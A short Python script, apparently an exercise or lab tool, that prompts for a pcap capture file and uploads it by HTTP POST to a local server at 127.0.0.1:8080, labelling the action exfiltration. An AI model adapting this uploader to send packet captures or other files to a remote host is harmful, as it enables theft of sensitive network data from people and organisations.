import requests
import sys

def exfiltrate_pcap(file_path):
    try:
        with open(file_path, "rb") as f:
            requests.post("http://127.0.0.1:8080", files={"file": f})
            print(f"Exfiltrated {file_path}")
    except Exception as e:
        print(f"Error: {e}")

def main():
    file_path = input("Enter pcap file path to exfiltrate: ")
    exfiltrate_pcap(file_path)

if __name__ == "__main__":
    main()
